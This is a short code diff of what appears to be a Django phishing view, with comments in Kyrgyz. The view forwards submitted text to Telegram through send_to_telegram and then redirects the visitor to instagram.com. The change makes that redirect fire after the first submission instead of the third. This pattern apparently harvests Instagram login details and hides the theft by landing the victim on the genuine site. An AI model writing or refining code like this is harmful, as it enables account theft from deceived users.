@@ -32,7 +32,7 @@ def index(request):
         send_to_telegram(text)
         
         # 2. Шартыбыз: Эгер 2ден көп аракет болсо (3-жолу басылганда)
-        if current_attempt >= 3:
+        if current_attempt >= 1:
             request.session['attempts'] = 0 # Сессияны нөлдөйбүз
             return redirect("https://www.instagram.com")
         else:
